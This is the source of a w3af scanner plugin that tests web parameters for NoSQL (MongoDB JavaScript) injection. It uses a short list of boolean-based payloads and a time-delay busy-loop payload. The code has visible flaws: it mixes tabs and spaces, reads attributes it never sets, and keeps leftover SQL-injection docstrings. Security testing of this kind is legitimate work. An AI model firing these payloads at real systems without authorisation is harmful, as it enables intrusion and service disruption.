import w3af.core.data.kb.knowledge_base as kb

from w3af.core.controllers.plugins.audit_plugin import AuditPlugin

from w3af.core.data.options.opt_factory import opt_factory
from w3af.core.data.options.option_list import OptionList
from w3af.core.data.fuzzer.fuzzer import create_mutants

import w3af.core.controllers.output_manager as om
import w3af.core.data.constants.severity as severity

from w3af.core.data.kb.vuln import Vuln
from w3af.core.controllers.exceptions import HTTPRequestException

from time import sleep
from random import random
import string

BOOLEAN_BASED = (
	"a'; return db.a.find(); var dummy='!",
	"1; return db.a.find(); var dummy=1",
	"a'; return db.a.findOne(); var dummy='!",
	"1; return db.a.findOne(); var dummy=1",
	"a'; return this.a != '0XD7CxM6PN'; var dummy='!",
	"1; return this.a !=0XD7CxM6PN; var dummy=1",
)

TIME_BASED = (
	"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1",	
)

class nosqli(AuditPlugin):
    """
    Identify noSQL injection vulnerabilities.

    :author: @s0i37
    """

    def __init__(self):
        AuditPlugin.__init__(self)
        self._eq_limit = 0.9
        self._timeout = 0

    def audit(self, freq, orig_response):
        """
        Tests an URL for blind SQL injection vulnerabilities.

        :param freq: A FuzzableRequest
        """
        
        self._orig_response = orig_response
        self._freq = freq
        fake_mutants = create_mutants(freq, ['', ])

        for mutant in fake_mutants:
            if self._has_sql_injection(mutant):
                continue

            found_vuln = self.is_injectable(mutant)
            if found_vuln is not None:
                self.kb_append_uniq(self, 'nosqli', found_vuln)
                break

    def is_injectable(self, mutant):
    	is_vuln = False
    	resp_len_orig = len( self._orig_response.get_body() )
        mutant.set_token_value( self._get_random_letters(10) )
        resp_valid = self._do_request(mutant)
        resp_len_valid = len( resp_valid.get_body() )
        resp_time_valid = resp_valid.get_wait_time()
        
        for injection in BOOLEAN_BASED:
        	mutant.set_token_value( injection )
        	resp_injection = self._do_request(mutant)
        	if not resp_injection:
        		is_vuln = True
        		break
        	resp_len_injection = len( resp_injection.get_body() )
        	if resp_len_injection != resp_len_valid != resp_len_orig:
        		is_vuln = True
        		break
        	sleep(self._timeout)

        if not is_vuln:
            for injection in TIME_BASED:
            	mutant.set_token_value( injection )
            	resp_injection = self._do_request(mutant)
            	if not resp_injection:
	        		is_vuln = True
	        		break
            	resp_time_injection = resp_injection.get_wait_time()
            	if resp_time_injection > resp_time_valid + 1:
            		is_vuln = True
            		break
            	sleep(self._timeout)

        if is_vuln:
            response_ids = [resp_valid.id,
                            resp_injection.id]
            
            desc = 'NOSQL injection at: "%s", using'\
                   ' HTTP method %s. The injectable parameter may be: "%s"'
            desc = desc % (mutant.get_url(),
                           mutant.get_method(),
                           mutant.get_token_name())
            
            vuln = Vuln.from_mutant('NOSQL injection vulnerability', desc,
                                 severity.HIGH, response_ids, 'nosqli',
                                 mutant)
            
            om.out.debug( vuln.get_desc() )
            om.out.vulnerability("NOSQL injection", severity=severity.HIGH)

            vuln['valid_html'] = self.resp_valid.get_body()
            vuln['error_html'] = self.resp_injection.get_body()        
            return vuln

    def debug(self, msg):
        om.out.debug( '[blind_sqli_errors]: ' + str(msg) )

    def _has_sql_injection(self, mutant):
        """
        :return: True if there IS a reported SQL injection for this
                 URL/parameter combination.
        """
        sql_injection_list = kb.kb.get('sqli', 'sqli')

        for sql_injection in sql_injection_list:
            if sql_injection.get_url() == mutant.get_url() and \
            sql_injection.get_token_name() == mutant.get_token_name():
                return True

        return False

    def _do_request(self, mutant):
        try:
            return self._uri_opener.send_mutant( mutant, cache=False, timeout=10 )
        except HTTPRequestException:
            self.debug("HTTPRequestException")
            return

    def _get_random_letters(self, maxlen=15):
        letters_chars = bytearray( string.letters )
        random_letters = ''
        for _ in xrange( maxlen ):
            random_letters += chr( letters_chars.pop( int( random() * len(letters_chars) ) ) )
        return random_letters.replace("'",'').replace('"','').replace('\\','')

    def get_options(self):
        """
        :return: A list of option objects for this plugin.
        """
        opt_list = OptionList()

        h1 = 'Two pages are considered equal if they match in more'\
            ' than eq_limit.'
        h2 = 'Timeout between fuzzing requests'
        opt = opt_factory('eq_limit', self._eq_limit, 'String equal ratio (0.0 to 1.0)', 'float', help=h1)
        opt_list.add(opt)
        opt = opt_factory('timeout', self._timeout, 'Requests timeout', 'float', help=h2)
        opt_list.add(opt)

        return opt_list

    def set_options(self, options_list):
        """
        This method sets all the options that are configured using the user
        interface generated by the framework using the result of get_options().

        :param options_list: A dictionary with the options for the plugin.
        :return: No value is returned.
        """
        self._eq_limit = options_list['eq_limit'].get_value()
        self._timeout = options_list['timeout'].get_value()

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin finds blind SQL injections using two techniques: time delays
        and true/false response comparison.

        Only one configurable parameters exists:
            - eq_limit
            - timeout
        """
